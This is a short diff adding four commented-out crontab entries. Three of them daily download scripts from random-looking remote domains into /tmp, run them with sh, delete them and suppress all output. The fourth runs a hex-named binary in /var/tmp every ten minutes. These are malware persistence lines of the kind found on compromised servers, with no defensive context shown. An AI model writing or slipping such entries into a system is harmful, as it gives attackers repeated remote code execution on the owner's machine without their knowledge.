@@ -1,0 +1,4 @@
+#@daily wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
+#@daily wget -q http://update.sdgsafdsf.pw/upd2 -O /tmp/updatescript2;sh /tmp/updatescript2;rm -rf /tmp/updatescript2 > /dev/null 2>&1 
+#@daily wget -q http://update.omfg.pw/upd3 -O /tmp/updatescript3;sh /tmp/updatescript3;rm -rf /tmp/updatescript3 > /dev/null 2>&1 
+#*/10 * * * * /var/tmp/32a1e380 >/dev/null 2>&1
